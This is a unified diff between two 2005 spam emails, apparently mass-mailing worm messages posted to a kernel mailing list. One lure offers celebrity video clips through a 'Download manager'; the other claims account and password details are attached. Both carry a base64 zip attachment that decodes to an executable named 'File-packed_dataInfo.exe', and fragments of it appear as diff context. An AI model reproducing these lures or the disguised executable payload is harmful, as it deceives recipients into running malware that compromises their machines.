@@ -1,30 +1,29 @@
-From: webmaster@fepex.es
-Subject: Paris Hilton & Nicole Richie
-Date: Thu, 22 Dec 2005 13:26:28 GMT
-Message-ID: <3f3790.727b15412@fepex.es>
+From: info@cambridgedancers.org
+Subject: Registration_Confirmation
+Date: Thu, 22 Dec 2005 13:32:09 UTC
+Message-ID: <0e7b.27b4e8eaaf6fedd@oss.sgi.com>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="c2bd6807cdf5f279ca146.3b"
+Content-Type: multipart/mixed; boundary="=====caf68b9.f0b1172dfd6"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: XPost@oss.sgi.com
+To: netdev-bounce@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---c2bd6807cdf5f279ca146.3b
+--=====caf68b9.f0b1172dfd6
 
-The Simple Life:
+Account and Password Information are attached!
 
-View Paris Hilton & Nicole Richie video clips , pictures & more ;)
-Download is free until Jan, 2006!
 
-Please use our Download manager.
---c2bd6807cdf5f279ca146.3b
-Content-Type: application/octet-stream; name=downloadm.zip
+***** Go to: http://www.cambridgedancers.org
+***** Email: postman@cambridgedancers.org
+--=====caf68b9.f0b1172dfd6
+Content-Type: application/octet-stream; name=reg_pass.zip
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="downloadm.zip"
+Content-Disposition: attachment; filename="reg_pass.zip"
 
 UEsDBAoAAAAAAACQdjPMyus3XtgAAF7YAAAYAAAARmlsZS1wYWNrZWRfZGF0YUluZm8uZXhlTVqQ
 AAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -1001,4 +1000,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---c2bd6807cdf5f279ca146.3b--
+--=====caf68b9.f0b1172dfd6--
